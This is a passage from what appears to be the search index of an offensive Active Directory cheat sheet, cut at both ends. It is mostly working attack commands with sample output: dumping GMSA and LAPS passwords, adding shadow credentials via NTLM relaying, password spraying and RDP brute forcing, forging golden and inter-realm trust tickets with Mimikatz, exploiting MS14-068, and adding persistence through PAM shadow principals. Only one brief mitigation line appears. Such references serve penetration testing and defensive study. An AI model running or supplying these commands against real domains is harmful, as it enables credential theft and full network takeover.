</p> <pre><code># Create a machine with default password\n# must be run from a domain joined device connected to the domain\ndjoin /PROVISION /DOMAIN &lt;fqdn&gt; /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc\n</code></pre> <ul> <li>When you attempt to login using the credential you should have the following error code : <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</li> <li>Then you need to change the password with rpcchangepwd.py</li> </ul>"},{"location":"active-directory/pwd-precreated-computer/#references","title":"References","text":"<ul> <li>DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe</li> </ul>"},{"location":"active-directory/pwd-read-gmsa/","title":"Password - GMSA","text":""},{"location":"active-directory/pwd-read-gmsa/#reading-gmsa-password","title":"Reading GMSA Password","text":"<p>User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.</p>"},{"location":"active-directory/pwd-read-gmsa/#gmsa-attributes-in-the-active-directory","title":"GMSA Attributes in the Active Directory","text":"<ul> <li><code>msDS-GroupMSAMembership</code> (<code>PrincipalsAllowedToRetrieveManagedPassword</code>) - stores the security principals that can access the GMSA password.</li> <li><code>msds-ManagedPassword</code> - This attribute contains a BLOB with password information for group-managed service accounts.</li> <li><code>msDS-ManagedPasswordId</code> - This constructed attribute contains the key identifier for the current managed password data for a group MSA.</li> <li><code>msDS-ManagedPasswordInterval</code> - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</li> </ul>"},{"location":"active-directory/pwd-read-gmsa/#extract-nt-hash-from-the-active-directory","title":"Extract NT hash from the Active Directory","text":"<ul> <li> <p>mpgn/CrackMapExec <pre><code># Use --lsa to get GMSA ID\ncrackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99\ncrackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'\n</code></pre></p> </li> <li> <p>CravateRouge/bloodyAD <pre><code>bloodyAD --host 10.10.10.10 -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword\n</code></pre></p> </li> <li> <p>rvazarkar/GMSAPasswordReader <pre><code>GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT\n</code></pre></p> </li> <li> <p>micahvandeusen/gMSADumper <code>powershell   python3 gMSADumper.py -u User -p Password1 -d domain.local</code></p> </li> <li> <p>Active Directory Powershell   <pre><code>$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'\n$blob = $gmsa.'msDS-ManagedPassword'\n$mp = ConvertFrom-ADManagedPasswordBlob $blob\n$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword\n</code></pre></p> </li> <li> <p>kdejoyce/gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module</p> </li> </ul>"},{"location":"active-directory/pwd-read-gmsa/#forging-golden-gmsa","title":"Forging Golden GMSA","text":"<p>One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.</p> <p> You can't \"force reset\" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and <code>ManagedPasswordIntervalInDays</code>, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.</p> <ul> <li>Using GoldenGMSA <pre><code># Enumerate all gMSAs\nGoldenGMSA.exe gmsainfo\n# Query for a specific gMSA\nGoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112\n\n# Dump all KDS Root Keys\nGoldenGMSA.exe kdsinfo\n# Dump a specific KDS Root Key\nGoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb\n\n# Compute gMSA password\n# --sid &lt;gMSA SID&gt;: SID of the gMSA (required)\n# --kdskey &lt;Base64-encoded blob&gt;: Base64 encoded KDS Root Key\n# --pwdid &lt;Base64-encoded blob&gt;: Base64 of msds-ManagedPasswordID attribute value\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode\n</code></pre></li> </ul>"},{"location":"active-directory/pwd-read-gmsa/#references","title":"References","text":"<ul> <li>Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022</li> <li>Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022</li> <li>Practical guide for Golden SAML - Practical guide step by step to create golden SAML</li> </ul>"},{"location":"active-directory/pwd-read-laps/","title":"Password - LAPS","text":""},{"location":"active-directory/pwd-read-laps/#reading-laps-password","title":"Reading LAPS Password","text":"<p>Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. </p>"},{"location":"active-directory/pwd-read-laps/#determine-if-laps-is-installed","title":"Determine if LAPS is installed","text":"<pre><code>Get-ChildItem 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-FileHash 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-AuthenticodeSignature 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\n</code></pre>"},{"location":"active-directory/pwd-read-laps/#extract-laps-password","title":"Extract LAPS password","text":"<p>The \"ms-mcs-AdmPwd\" a \"confidential\" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users  - Windows/Linux:     <pre><code>bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n</code></pre>  - From Windows:</p> <ul> <li> <p>adsisearcher (native binary on Windows 8+)        <pre><code>([adsisearcher]\"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\").findAll() | ForEach-Object { $_.properties}\n([adsisearcher]\"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\").findAll() | ForEach-Object { $_.properties}\n</code></pre></p> </li> <li> <p>PowerView <pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime\n</code></pre></p> </li> <li> <p>LAPSToolkit <pre><code>$ Get-LAPSComputers\nComputerName                Password                                 Expiration         \n------------                --------                                 ----------         \nexample.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18\n\n$ Find-LAPSDelegatedGroups\n$ Find-AdmPwdExtendedRights\n</code></pre></p> </li> <li> <p>Powershell AdmPwd.PS        <pre><code>foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}\n</code></pre></p> </li> <li> <p>From Linux:</p> </li> <li> <p>pyLAPS to read and write LAPS passwords:        <pre><code># Read the password of all computers\n./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n# Write a random password to a specific computer\n./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n</code></pre></p> </li> <li> <p>CrackMapExec:        <pre><code>crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps\n</code></pre></p> </li> <li> <p>LAPSDumper <pre><code>python laps.py -u 'user' -p 'password' -d 'domain.local'\npython laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'\n</code></pre></p> </li> <li> <p>ldapsearch       <pre><code>ldapsearch -x -h\u00a0 -D \"@\" -w\u00a0 -b \"dc=&lt;&gt;,dc=&lt;&gt;,dc=&lt;&gt;\" \"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))\" ms-MCS-AdmPwd`\n</code></pre></p> </li> </ul>"},{"location":"active-directory/pwd-read-laps/#grant-laps-access","title":"Grant LAPS Access","text":"<p>The members of the group \"Account Operator\" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password</p> <pre><code>Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain \"domain.local\"\nAdd-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain \"domain.local\"\n</code></pre>"},{"location":"active-directory/pwd-shadow-credentials/","title":"Password - Shadow Credentials","text":"<p>Add Key Credentials to the attribute <code>msDS-KeyCredentialLink</code> of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.</p> <p> User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists</p> <p>Requirements:</p> <ul> <li>Domain Controller on (at least) Windows Server 2016</li> <li>Domain must have Active Directory <code>Certificate Services</code> and <code>Certificate Authority</code> configured</li> <li>PKINIT Kerberos authentication</li> <li>An account with the delegated rights to write to the <code>msDS-KeyCredentialLink</code> attribute of the target object</li> </ul> <p>Exploitation:  - Windows/Linux   <pre><code>bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody add shadowCredentials targetpc$\nbloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody remove shadowCredentials targetpc$ --key &lt;key from previous output&gt;\n</code></pre> - From Windows, use Whisker:   <pre><code># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.\nWhisker.exe list /target:computername$\n# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.\nWhisker.exe add /target:\"TARGET_SAMNAME\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\"\nWhisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1]\n# Removes a key credential from the target object specified by a DeviceID GUID.\nWhisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b\n</code></pre></p> <ul> <li>From Linux, use pyWhisker:   <pre><code># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"list\"\n# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.\npywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"add\" --filename \"test1\"\n# Removes a key credential from the target object specified by a DeviceID GUID.\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"remove\" --device-id \"a8ce856e-9b58-61f9-8fd3-b079689eb46e\"\n</code></pre></li> </ul> <p>Scenario:</p> <ul> <li>Scenario 1: Shadow Credential relaying</li> <li>Trigger an NTLM authentication from <code>DC01</code> (PetitPotam)</li> <li>Relay it to <code>DC02</code> (ntlmrelayx)</li> <li>Edit <code>DC01</code>'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)</li> <li> <p>Alternatively : <code>ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'</code></p> </li> <li> <p>Scenario 2: Workstation Takeover with RBCD   <pre><code># Only for C2: Add Reverse Port Forward from 8081 to Team Server 81\n\n# Set up ntlmrelayx to relay authentication from target workstation to DC \nproxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81\n\n# Execute printer bug to trigger authentication from target workstation \nproxychains python3 printerbug.py ez.lab/matt:Password1\\!@ws2.ez.lab ws1@8081/file\n\n# Get a TGT using the newly acquired certificate via PKINIT \nproxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR\n\n# Get a ST (service ticket) for the target account \nproxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v\n\n# Utilize the ST for future activity \nexport KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache\nproxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab\n</code></pre></p> </li> </ul>"},{"location":"active-directory/pwd-shadow-credentials/#references","title":"References","text":"<ul> <li>Shadow Credentials: Workstation Takeover Edition - Matthew Creel</li> <li>Shadow Credentials - The Hacker Recipes</li> <li>Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17</li> </ul>"},{"location":"active-directory/pwd-spraying/","title":"Password - Spraying","text":"<p>Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. </p> <p>The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. </p> <p>Most of the time the best passwords to spray are :</p> <ul> <li><code>P@ssw0rd01</code>, <code>Password123</code>, <code>Password1</code>, <code>Hello123</code>, <code>mimikatz</code></li> <li><code>Welcome1</code>/<code>Welcome01</code></li> <li>$Companyname1 :<code>$Microsoft1</code></li> <li>SeasonYear : <code>Winter2019*</code>, <code>Spring2020!</code>, <code>Summer2018?</code>, <code>Summer2020</code>, <code>July2020!</code></li> <li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li> <li>Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)</li> </ul>"},{"location":"active-directory/pwd-spraying/#kerberos-pre-auth-bruteforcing","title":"Kerberos pre-auth bruteforcing","text":"<p>Using <code>kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p> <p>Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).</p> <ul> <li>Username bruteforce   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt\n</code></pre></li> <li>Password bruteforce   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username\n</code></pre></li> <li>Password spray   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123\nroot@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt\nroot@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log\n</code></pre></li> </ul>"},{"location":"active-directory/pwd-spraying/#spray-a-pre-generated-passwords-list","title":"Spray a pre-generated passwords list","text":"<ul> <li>Using <code>crackmapexec</code> and <code>mp64</code> to generate passwords and spray them against SMB services on the network.   <pre><code>crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`\n</code></pre></li> <li>Using <code>DomainPasswordSpray</code> to spray a password against all users of a domain.   <pre><code># https://github.com/dafthack/DomainPasswordSpray\nInvoke-DomainPasswordSpray -Password Summer2021!\n# /!\\ be careful with the account lockout !\nInvoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n</code></pre></li> <li>Using <code>SMBAutoBrute</code>.   <pre><code>Invoke-SMBAutoBrute -UserList \"C:\\ProgramData\\admins.txt\" -PasswordList \"Password1, Welcome1, 1qazXDR%+\" -LockoutThreshold 5 -ShowVerbose\n</code></pre></li> </ul>"},{"location":"active-directory/pwd-spraying/#spray-passwords-against-the-rdp-service","title":"Spray passwords against the RDP service","text":"<ul> <li>Using RDPassSpray to target RDP services.   <pre><code>git clone https://github.com/xFreed0m/RDPassSpray\npython3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]\n</code></pre></li> <li>Using hydra and ncrack to target RDP services.   <pre><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10\nncrack \u2013connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10\n</code></pre></li> </ul>"},{"location":"active-directory/pwd-spraying/#badpwdcount-attribute","title":"BadPwdCount attribute","text":"<p>The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.</p> <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users\nLDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: &lt;never&gt;\nLDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: &lt;never&gt;\n</code></pre>"},{"location":"active-directory/trust-pam/","title":"Trust - Privileged Access Management","text":"<p>PAM (Privileged Access Management) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon.</p> <p>Requirements:  * Windows Server 2016 or earlier   </p> <p>If we compromise the bastion we get <code>Domain Admins</code> privileges on the other domain</p> <ul> <li>Default configuration for PAM Trust     <pre><code># execute on our forest\nnetdom trust lab.local /domain:bastion.local /ForestTransitive:Yes \nnetdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes \nnetdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes \nnetdom trust lab.local /domain:bastion.local /Quarantine:No\n# execute on our bastion\nnetdom trust bastion.local /domain:lab.local /ForestTransitive:Yes\n</code></pre></li> <li>Enumerate PAM trusts     <pre><code># Detect if current forest is PAM trust\nImport ADModule\nGet-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}\n\n# Enumerate shadow security principals \nGet-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl\n\n# Enumerate if current forest is managed by a bastion forest\n# Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External\nGet-ADTrust -Filter {(ForestTransitive -eq $True)} \n</code></pre></li> <li>Compromise<ul> <li>Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)</li> <li>Using SID History</li> </ul> </li> <li>Persistence<ul> <li>Windows/Linux: <pre><code>bloodyAD --host 10.1.0.4 -u john.doe -p 'Password123!' -d bloody add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local' Administrator\n</code></pre></li> <li>Windows only: <pre><code># Add a compromised user to the group \nSet-ADObject -Identity \"CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local\" -Add @{'member'=\"CN=Administrator,CN=Users,DC=domain,DC=local\"}\n</code></pre></li> </ul> </li> </ul>"},{"location":"active-directory/trust-pam/#references","title":"References","text":"<ul> <li>How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal</li> </ul>"},{"location":"active-directory/trust-relationship/","title":"Trust - Relationship","text":"<ul> <li>One-way</li> <li>Domain B trusts A</li> <li>Users in Domain A can access resources in Domain B</li> <li>Users in Domain B cannot access resources in Domain A</li> <li>Two-way</li> <li>Domain A trusts Domain B</li> <li>Domain B trusts Domain A</li> <li>Authentication requests can be passed between the two domains in both directions</li> </ul>"},{"location":"active-directory/trust-relationship/#enumerate-trusts-between-domains","title":"Enumerate trusts between domains","text":"<ul> <li>Native <code>nltest</code> <pre><code>nltest /trusted_domains\n</code></pre></li> <li>PowerShell <code>GetAllTrustRelationships</code> <pre><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n\nSourceName          TargetName                    TrustType      TrustDirection\n----------          ----------                    ---------      --------------\ndomainA.local      domainB.local                  TreeRoot       Bidirectional\n</code></pre></li> <li>Crackmapexec module <code>enum_trusts</code> <pre><code>cme ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -M enum_trusts \n</code></pre></li> </ul>"},{"location":"active-directory/trust-relationship/#exploit-trusts-between-domains","title":"Exploit trusts between domains","text":"<p> Require a Domain-Admin level access to the current domain.</p> Source Target Technique to use Trust relationship Root Child Golden Ticket + Enterprise Admin group (Mimikatz /groups) Inter Realm (2-way) Child Child SID History exploitation (Mimikatz /sids) Inter Realm Parent-Child (2-way) Child Root SID History exploitation (Mimikatz /sids) Inter Realm Tree-Root (2-way) Forest A Forest B PrinterBug + Unconstrained delegation ? Inter Realm Forest or External (2-way)"},{"location":"active-directory/trust-relationship/#references","title":"References","text":"<ul> <li>External Trusts Are Evil - 14 March 2023 - Charlie Clark (@exploitph)</li> <li>Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</li> </ul>"},{"location":"active-directory/trust-sid-hijacking/","title":"Child Domain to Forest Compromise - SID Hijacking","text":"<p>Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root.</p> <p>Requirements:  - KRBTGT Hash - Find the SID of the domain     <pre><code>$ Convert-NameToSid target.domain.com\\krbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n\n# with Impacket\nlookupsid.py domain/user:password@10.10.10.10\n</code></pre> - Replace 502 with 519 to represent Enterprise Admins - Create golden ticket and attack parent domain.      <pre><code>kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt\n</code></pre></p>"},{"location":"active-directory/trust-ticket/","title":"Forest to Forest Compromise - Trust Ticket","text":"<ul> <li>Require: SID filtering disabled</li> </ul> <p>From the DC, dump the hash of the <code>currentdomain\\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using  Mimikatz, adding the SID for the target domain's enterprise admins group to our SID history.</p>"},{"location":"active-directory/trust-ticket/#dumping-trust-passwords-trust-keys","title":"Dumping trust passwords (trust keys)","text":"<p>Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts.</p> <pre><code>lsadump::trust /patch\n\nor find the TRUST_NAME$ machine account hash\n</code></pre>"},{"location":"active-directory/trust-ticket/#create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz","title":"Create a forged trust ticket (inter-realm TGT) using Mimikatz","text":"<pre><code>mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi\nmimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi\n</code></pre>"},{"location":"active-directory/trust-ticket/#use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service","title":"Use the Trust Ticket file to get a ST for the targeted service","text":"<pre><code>.\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local\n.\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt\n</code></pre> <p>Inject the ST file and access the targeted service with the spoofed rights.</p> <pre><code>kirbikator lsa .\\ticket.kirbi\nls \\\\machine.domain.local\\c$\n</code></pre>"},{"location":"active-directory/CVE/MS14-068/","title":"MS14-068 Checksum Validation","text":"<p>This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p> <ul> <li>RPCClient   <pre><code>rpcclient $&gt; lookupnames john.smith\njohn.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)\n</code></pre></li> <li>WMI   <pre><code>wmic useraccount get name,sid\nAdministrator  S-1-5-21-3415849876-833628785-5197346142-500   \nGuest          S-1-5-21-3415849876-833628785-5197346142-501   \nAdministrator  S-1-5-21-297520375-2634728305-5197346142-500   \nGuest          S-1-5-21-297520375-2634728305-5197346142-501   \nkrbtgt         S-1-5-21-297520375-2634728305-5197346142-502   \nlambda         S-1-5-21-297520375-2634728305-5197346142-1110 \n</code></pre></li> <li>Powerview   <pre><code>Convert-NameToSid high-sec-corp.localkrbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n</code></pre></li> <li>CrackMapExec: <code>crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid</code> </li> </ul> <pre><code>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068\n</code></pre> <p>Generate a ticket with <code>metasploit</code> or <code>pykek</code></p> <pre><code>Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum\n   Name      Current Setting                                Required  Description\n   ----      ---------------                                --------  -----------\n   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL\n   PASSWORD  P@ssw0rd                                       yes       The Domain User password\n   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier\n   RPORT     88                                             yes       The target port\n   Timeout   10                                             yes       The TCP timeout to establish connection and read data\n   USER      lambda                                         yes       The Domain User\n   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000\n</code></pre> <pre><code># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek\n$ git clone https://github.com/SecWiki/windows-kernel-exploits\n$ python ./ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;\n$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org\n$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10\n$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066\n-1105\n  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!\n  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!\n  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!\n</code></pre> <p>Then use <code>mimikatz</code> to load the ticket.</p> <pre><code>mimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\"\n</code></pre>"},{"location":"active-directory/CVE/MS14-068/#mitigations","title":"Mitigations","text":"<ul> <li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li> </ul>"},{"location":"active-directory/CVE/MS14-068/#references","title":"References","text":"<ul> <li>Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</li> </ul>"},{"location":"active-directory/CVE/NoPAC/","title":"NoPAC / samAccountName Spoofing","text":"<p>During S4U2Self, the KDC will try to append a '\\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.</p> <p>Requirements</p> <ul> <li>MachineAccountQuota &gt; 0</li> </ul> <p>Check for exploitation</p> <ol> <li>Check the MachineAccountQuota of the account   <pre><code>crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ\nStandIn.exe --object ms-DS-MachineAccountQuota=*\n</code></pre></li> 